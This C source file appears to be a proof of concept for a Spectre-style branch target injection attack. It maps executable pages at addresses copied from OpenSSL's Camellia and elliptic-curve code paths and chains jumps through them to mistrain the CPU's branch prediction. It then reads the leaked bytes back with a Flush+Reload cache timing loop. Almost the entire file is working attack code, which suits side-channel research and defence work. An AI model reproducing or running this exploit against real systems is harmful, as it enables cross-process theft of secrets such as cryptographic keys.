#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include "common.h"

// Defines the bandwidth we can communicate
// from speculative -> von neuman
// e.g. 256 would be 1 byte of info
// Tradeoff here is larger bandwidth means we have
// to check more places in probe_buf (and flush them)
#define NUM_PROBES 256
#define DECRYPT_LEN 256

// These define the stride length we take between probes
// This thwarts a clever CPU's stride prediction
// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
// Generally, this results in not seeing ANY winning probes
// in which case, we change cur_probe_space and retry
#define MAX_PROBE_SPACE (1000003)
double avgpct = 0;

uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;


// The (heap-allocated) probe buffer
// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
// in the cache to communicate the value i from speculative -> von neuman
uint8_t __attribute__((section(".probe_buf"))) *probe_buf;


// This is a simple counter, accessed by the speculative function (target_fn)
// so it can compute on it.
uint16_t signal_idx = 0;
uint64_t instr = 0;


// Stats
uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
uint64_t tot_time = 0;      // Number cycles total

unsigned int junk=0;    // For rdtscp


void *map;
#define TARGET_FN_ADDR 0x414100401000



typedef struct jump_st {
    uint64_t from;
    uint64_t to;
} jump;

#define PAGE_SIZE 0x1000
#define MAX_PAGES 100
#define NUM_JUMPS 32


inline void call(void *fn_ptr) __attribute__((always_inline));
void call(void* fn_ptr) {
    asm volatile ("jmpq *%%rax\n" :: "a"(fn_ptr) :);
}

inline void push(uint64_t val) __attribute__((always_inline));
void push(uint64_t val) {
    asm volatile ("push %%rax\n" :: "a"(val):);
}


uint64_t loaded_pages[MAX_PAGES];
int loaded_pages_idx = 0;
jump jump_addrs[NUM_JUMPS] = {
        /*
        {0x7ffff785a926, 0x7ffff785c261}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c277}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c28f}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c2a2}, //  retq   
        {0x7ffff785abfc, 0x7ffff785c2b5}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c2cd}, //  retq   
        {0x7ffff785a34a, 0x7ffff785c2e3}, //  retq   
        {0x7ffff785a27e, 0x7ffff785c2f3}, //  retq   
        {0x7ffff785a74b, 0x7ffff785ac1d}, //  retq   
        {0x7ffff785a74b, 0x7ffff785ac28}, //  retq   
        {0x7ffff785abfc, 0x7ffff785ac36}, //  retq   
        {0x7ffff785ac40, 0x7ffff785c3c5}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c3d0}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c3e3}, //  retq   
        {0x7ffff785a926, 0x7ffff785c3f3}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c3ff}, //  retq   
        {0x7ffff785a34a, 0x7ffff785c4b7}, //  retq   
        {0x7ffff785a27e, 0x7ffff785c4c9}, //  retq   
        {0x7ffff785a27e, 0x7ffff785c538}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c543}, //  retq   
        {0x7ffff785a926, 0x7ffff785c54e}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c55e}, //  retq   
        {0x7ffff785a34a, 0x7ffff785c569}, //  retq   
        {0x7ffff785a41a, 0x7ffff785c61d}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c628}, //  retq   
        {0x7ffff785abfc, 0x7ffff785c638}, //  retq   
        {0x7ffff785a926, 0x7ffff785c645}, //  retq   
        {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
        {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c22a}, //  retq   
        */
        // in openssl-accept.repeats2}, //254 repeats (line 14491502):
        // part of EC_GFp_nistp224_method()
        /*
        {0x7ffff785a74b, 0x7ffff785c256}, //  retq   
        {0x7ffff785a926, 0x7ffff785c261}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c277}, //  retq   

        {0x7ffff785a74b, 0x7ffff785c28f}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c2a2}, //  retq   
        {0x7ffff785abfc, 0x7ffff785c2b5}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c2cd}, //  retq   

        {0x7ffff785a34a, 0x7ffff785c2e3}, //  retq   
        {0x7ffff785a27e, 0x7ffff785c2f3}, //  retq   
        {0x7ffff785a74b, 0x7ffff785ac1d}, //  retq   
        {0x7ffff785a74b, 0x7ffff785ac28}, //  retq   

        {0x7ffff785abfc, 0x7ffff785ac36}, //  retq   
        {0x7ffff785ac40, 0x7ffff785c3c5}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c3d0}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c3e3}, //  retq   

        */
/*
        {0x7ffff785a926, 0x7ffff785c3f3}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c3ff}, //  retq   
        {0x7ffff785a34a, 0x7ffff785c4b7}, //  retq   
        {0x7ffff785a27e, 0x7ffff785c4c9}, //  retq   

        {0x7ffff785a27e, 0x7ffff785c538}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c543}, //  retq   
        {0x7ffff785a926, 0x7ffff785c54e}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c55e}, //  retq   

        {0x7ffff785a34a, 0x7ffff785c569}, //  retq   
        {0x7ffff785a41a, 0x7ffff785c61d}, //  retq   
        {0x7ffff785a74b, 0x7ffff785c628}, //  retq   
        {0x7ffff785abfc, 0x7ffff785c638}, //  retq   

        {0x7ffff785a926, 0x7ffff785c645}, //  retq   
        {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
        {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
        {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
        */
        //*/
        /*
        // CAMELLIA256-SHA / EVP_MD_CTX_init...
        {0x7ffff780d32d, 0x7ffff780d3ff}, //  retq   
        {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
        {0x7ffff77fedad, 0x7ffff77fe8f0}, //  callq  *0x36d5f5(%rip)        # 0x7ffff7b6c3a8
        {0x7ffff77fe8f7, 0x7ffff7458a80}, //  jmpq   *%rax
        {0x7ffff745687e, 0x7ffff7458ae0}, //  retq   
        {0x7ffff7458b29, 0x7ffff77fedb3}, //  retq   
        {0x7ffff77fede3, 0x7ffff788a513}, //  retq   
        {0x7ffff77fdb40, 0x7ffff7470a30}, //  jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
        {0x7ffff7470a71, 0x7ffff788a40a}, //  retq   
        {0x7ffff788a495, 0x7ffff780cc39}, //  retq   
        {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
        {0x7ffff77fedad, 0x7ffff77fe8f0}, //  callq  *0x36d5f5(%rip)        # 0x7ffff7b6c3a8
        {0x7ffff77fe8f7, 0x7ffff7458a80}, //  jmpq   *%rax
        {0x7ffff745687e, 0x7ffff7458ae0}, //  retq   
        {0x7ffff7458b29, 0x7ffff77fedb3}, //  retq   
        {0x7ffff77fede3, 0x7ffff788a513}, //  retq   
        {0x7ffff77fdb40, 0x7ffff7470a30}, //  jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
        {0x7ffff7470a71, 0x7ffff788a40a}, //  retq   
        {0x7ffff788a495, 0x7ffff780cc5d}, //  retq   
        {0x7ffff788a28b, 0x7ffff788a3b1}, //  retq   
        {0x7ffff77fedad, 0x7ffff77fe8f0}, //  callq  *0x36d5f5(%rip)        # 0x7ffff7b6c3a8
        {0x7ffff77fe8f7, 0x7ffff7458a80}, //  jmpq   *%rax
        {0x7ffff745687e, 0x7ffff7458ae0}, //  retq   
        {0x7ffff7458b29, 0x7ffff77fedb3}, //  retq   
        {0x7ffff77fede3, 0x7ffff788a513}, //  retq   
        {0x7ffff77fdb40, 0x7ffff7470a30}, //  jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
        {0x7ffff7470a71, 0x7ffff788a40a}, //  retq   
        {0x7ffff788a495, 0x7ffff780cc6e}, //  retq   
        {0x7ffff780cc45, 0x7ffff780d437}, //  retq   
        {0x7ffff780d407, 0x7ffff789730b}, //  retq   
        {0x7ffff7897318, 0x7ffff788a420}, //  retq  
        //*/

        {0x7ffff77d304c, 0x7ffff77dc0d4}, // :   retq   
        {0x7ffff77d314c, 0x7ffff77dc1d4}, // :   retq   
        {0x7ffff77d324c, 0x7ffff77dc2d4}, // :   retq   
        {0x7ffff77d334c, 0x7ffff77dc3d4}, // :   retq   
        {0x7ffff77d344c, 0x7ffff77dc4d4}, // :   retq   
        {0x7ffff77d354c, 0x7ffff77dc5d4}, // :   retq   
        {0x7ffff77d364c, 0x7ffff77dc6d4}, // :   retq   
        {0x7ffff77d374c, 0x7ffff77dc7d4}, // :   retq   
        {0x7ffff77d384c, 0x7ffff77dc8d4}, // :   retq   
        {0x7ffff77d394c, 0x7ffff77dc9d4}, // :   retq   
        {0x7ffff77d3a4c, 0x7ffff77dcad4}, // :   retq   
        {0x7ffff77d3b4c, 0x7ffff77dcbd4}, // :   retq   
        {0x7ffff77d3c4c, 0x7ffff77dccd4}, // :   retq   
        {0x7ffff77d3d4c, 0x7ffff77dcdd4}, // :   retq   
        {0x7ffff77d3e4c, 0x7ffff77dced4}, // :   retq   
        {0x7ffff77d3f4c, 0x7ffff77dcfd4}, // :   retq   

        {0x7ffff77e3a4c, 0x7ffff77eccd4}, // :   retq   
        {0x7ffff77e7bf9, 0x7ffff77e9421}, // :   retq   
        {0x7ffff77ee8a0, 0x7ffff77e836f}, // :   retq   
        {0x7ffff77e840d, 0x7ffff77e9548}, // :   retq   
        {0x7ffff77e7d22, 0x7ffff77e9591}, // :   retq   
        {0x7ffff77e95a1, 0x7ffff77ecc4b}, // :   retq   
        {0x7ffff77ee9a8, 0x7ffff77e33d8}, // :   retq   
        {0x7ffff77e3457, 0x7ffff77e37a5}, // :   retq   
        {0x7ffff77e37b3, 0x7ffff77ecc61}, // :   retq   
        {0x7ffff77e7bf9, 0x7ffff77e3965}, // :   retq   
        {0x7ffff77e7166, 0x7ffff77e7d95}, // :   retq   
        {0x7ffff77e7da6, 0x7ffff77e396d}, // :   retq   
        {0x7ffff77e7166, 0x7ffff77e7d95}, // :   retq   
        {0x7ffff77e7da6, 0x7ffff77e3978}, // :   retq   
        {0x7ffff77e7166, 0x7ffff77e8d90}, // :   retq   
        {0x7ffff77e8da6, 0x7ffff77e3985}, // :   retq   

    };


void load_page(uint64_t addr)
{
    uint64_t page = addr & ~(PAGE_SIZE-1);
    int i;
    for (i=0; i<loaded_pages_idx; i++) {
        if (loaded_pages[i] == page) {
            // Already loaded
            return;
        }
    }
    loaded_pages[loaded_pages_idx++] = page;

    void *map = mmap((void*)page, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);

    if (map == ((void*)-1)) {
        printf("Error mapping %lx (page %lx):\n", addr, page);
        perror("mmap");
        exit(-1);
    }
    printf("Mapped %p -> %p\n", (void*)page, map);

    // Fill with returns:
    memset(map, '\xc3', PAGE_SIZE);
}





// We define this function in assembly (target_fn.S)
// It is never called directly (essentially dead code)
// However, indirect.c trains the processor to think the indirect
// jump in common.c::indirect() is going to call this function
// We flush the fn_ptr used by indirect(), forcing the CPU to
// (mis)speculate and start processing this function.
// In reality, the CPU will (eventually) call check_probes()
// where we collect results and see what's in cache
void target_fn(void) __attribute__((section(".targetfn")));
void end_target_fn(void);

uint64_t results[NUM_PROBES];

void check_probes() {
    // Because indirect_camellia pushed rbx and rbp,
    // we have to pop them here to restore the stack
    // (and then we re-push them...)
    //asm volatile("pop %%rbx\n"
    //        "pop %%rbp\n" :::);

    uint64_t t0, t1;
    uint8_t *addr;

    int i, mix_i;
    for (i=0; i<NUM_PROBES; i++) {
        //mix_i = ((i*13) + 7) & 15;
        mix_i = i;
        addr = &probe_buf[mix_i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[mix_i]++;
            //printf("# %lu\n", t1-t0);
            //_mm_clflush(addr);
        }
    }
    tot_runs++;

    // Clear probe_buf from cache
    for (i=0; i<NUM_PROBES; i++) {
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }
    //usleep(100);
}


typedef void (*fn_ptr_t)(void);

uint64_t jmp_ptr;
fn_ptr_t *fn_ptr_ptr;   // This is a pointer that when dereferenced
                    // will yield a void (*)(void) that points to check_probes.
                    // Now we can move this around (malloc each time)




void indirect_camellia(register uint64_t *_jmp_ptr) {

    // prologue stores these on stack, but we don't want em
    //asm volatile("pop %%rbx\n"
    //        "pop %%rbp\n" :::);
    // First, push where we want to come back to:
    // Note: check_probes will do a normal return,
    // but it's never called (it's returned into
    // after the speculative head fake).
    // That's ok, because this function's return address
    // will be on the stack, and check_probes() will
    // consume it.
    register int i;
    //void *ret = check_probes;
    //push((uint64_t)ret);

    // To test:
    // Maybe we want a cached-copy of this value?
    //push((uint64_t)fn_ptr);
    //asm volatile ("push %%rax\n" :: "a"(fn_ptr):);

    //asm volatile ("push %%rax\n" :: "a"(0x7ffff788a420):);
    asm volatile ("push %%rax\n" :: "a"(&&done_jumps):);

    for (i=NUM_JUMPS-2; i>=0; i--) {
        //push(jump_addrs[i].to);
        //register addr;
        asm volatile ("push %%rax\n" :: "a"(jump_addrs[i].to):);
    }

    // Do something slow to stall the pipeline???
    // Call the first thing in the jump chain
    //call((void (*)(void))jump_addrs[0].from);
    asm volatile (//"add (%%rcx), %%rax\n"
            "jmpq *%%rcx\n" :: "c"(jump_addrs[0].from), "a"(fn_ptr), "b"(_jmp_ptr):);
            //*/

    //asm volatile ("jmpq *%%rax\n" :: "a"(jump_addrs[0].from):);

done_jumps:
    asm volatile("nop\n":::);
    //asm volatile ("add (%%rcx), %%rax\n" :: "c"(jmp_ptr));
    //(*fn_ptr)();
    //t0 = _rdtscp(&junk);
    //fn_ptr = *fn_ptr_ptr;
    //t1 = _rdtscp(&junk);
    //printf("%d\n", t1-t0);
    //(**fn_ptr_ptr)();
    //(*(void(*)(void))(jump_addrs[NUM_JUMPS-1].to))();
}


void (*fn_ptr)(void);


void measure() {
    fn_ptr = check_probes;
    //jmp_ptr = 0x400e60;
    jmp_ptr = 0;
    int i;


    int misses = 0;
    uint64_t last_i = 0xff;

    while (1) {
        for (i=0; i<15000; i++) {
            _mm_clflush(fn_ptr);
            _mm_clflush(&fn_ptr);
            _mm_clflush(&jmp_ptr);
            //_mm_clflush(jmp_ptr);
            /*
            fn_ptr_ptr = malloc(sizeof(void*));
            *fn_ptr_ptr = check_probes;
            _mm_clflush(fn_ptr_ptr);
            */
            indirect_camellia(&jmp_ptr);
            usleep(1);
        }
        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;

        uint64_t max_res=0, max_i=0;
        for (i=0; i<NUM_PROBES; i++) {
            if (results[i]>max_res) {
                max_res = results[i];
                max_i = i;
            }
        }

        if ((max_res > 10 && avg < 50) || (max_res > 2 && avg < 30)){
            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
                     max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
            avgpct += ((float)max_res)/tot_runs;

            /*
            if (max_i != ((last_i + 1)&0xff)) {
                //printf("---- ERROR: ^^^^^^^^^\n");
                //exit(-1);
            }//*/
            last_i = max_i;
            signal_idx++;
            instr++;
            misses = 0;
            if (signal_idx > DECRYPT_LEN) {
                avgpct /= DECRYPT_LEN;
                avgpct *= 100;
                printf("total avg hit rate = %0.5f%%\n", avgpct);
                exit(0);
            }

        } else {
            printf("--[%lu]: %lu, %lu avg cycles ps %ld, 13 had: %lu, %lu tot hits\n", max_i, max_res, avg, cur_probe_space, results[13], cache_hits);
            /*
            for (i=0; i<NUM_PROBES; i++) {
                printf("  %d: %d\n", i, results[i]);
            }*/
            misses++;
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;

        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        //signal_idx %= NUM_PROBES;
        usleep(1000);
    }


}

int main()
{
    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    printf("probe_buf @%p\n", probe_buf);
    int i =0;
    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }

    // Setup of OpenSSL Camellia EVP_MD_CTX_init jumps
    uint64_t target = jump_addrs[NUM_JUMPS-1].to;
    uint64_t min_diff = jump_addrs[0].to - target;

    // Assume %rax = where we want to jump to (e.g. fn_ptr), (%rbx) = 0 (but is uncached)
    uint8_t callq_rax[] = {
        0x48, 0x03, 0x03,   // add (%rbx),%rax
        //0xff, 0xd0,         //  callq *%rax
         0xff, 0xe0,  // jmpq *%rax
    };
    int callq_offset = 2;

    memset(loaded_pages, 0, sizeof(uint64_t)*MAX_PAGES);
    for (i=0; i<NUM_JUMPS-1; i++) {
        load_page(jump_addrs[i].from);
        load_page(jump_addrs[i].to);

        uint64_t target_diff = jump_addrs[i].to - target;
        if (target_diff < min_diff) {
            min_diff = target_diff;
        }

        // Write the jump from this .to to  the next .from
        // get difference - 5 (len(jmpq $xxxx) instruction)
        uint8_t *p = (uint8_t*)(jump_addrs[i].to);
        int32_t diff = jump_addrs[i+1].from - jump_addrs[i].to;
        if (diff > 0 && diff < 5) {
            // Fill with nops instead
            // a jmpq instruction would overwrite the next
            // retq byte...
            memset(p, '\x90', diff);
        } else {
            // Fill with a jump
            *p++ = 0xe9; // jumpq
            int32_t from = diff - 5;    // -5 to account for the length of jmpq (32-bit relative)
            if (i == (NUM_JUMPS - 2)) {
                from -= (sizeof(callq_rax) - callq_offset);
                // -2 so we can have the jmpq *%rax be right at the actual target
            }
            memcpy(p, &from, 4);
        }
    }

    // The last .from should be filled with:
    // 48 8b 04 25 00 00 44 00  mov (0x440000),%rax
    // ff d0                    callq *%rax

    uint8_t stalled_jmp[] = {
                            0x90, 0x90,
                            0x90,                               // nop
            0x48, 0x8b, 0x04, 0x25, 0x00, 0x00, 0x44, 0x00,     // mov (0x440000),%rax
                            //0x90, 0x90,                         // nop, nop
                            //0x50,                               // push %rax
                            0x90,
                            0x90,
                            //0xeb, 0x02,                          // jmp +2
                            0x90, 0x90,                         // nop, no
                            0xff, 0xd0,                         // callq *%rax
                            //0xc3, 0x90,
                            0x90};

    //memcpy((void*)jump_addrs[NUM_JUMPS-1].to, stalled_jmp, 20);

    load_page(jump_addrs[NUM_JUMPS-1].to);
    printf("Copying 0x%lx bytes to 0x%08lx...we have 0x%lx bytes of head space\n", end_target_fn-target_fn,
            (uint64_t)jump_addrs[NUM_JUMPS-1].to, min_diff);
    // Copy the target_fn code into the last jump_addrs[NUM_JUMPS-1].to
    // This will hopefully be speculatively called...
    memcpy((void*)jump_addrs[NUM_JUMPS-1].to, target_fn, end_target_fn-target_fn);

    memcpy((void*)jump_addrs[NUM_JUMPS-1].from - (sizeof(callq_rax) - callq_offset), callq_rax, sizeof(callq_rax));


    /*
    map = mmap((void*)TARGET_FN_ADDR, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    memcpy(map, indirect, ((uint64_t)end_indirect)-((uint64_t)indirect));
    memcpy(map+600, target_fn, end_target_fn-target_fn);

    */
    fn_ptr = check_probes;
    measure();
}

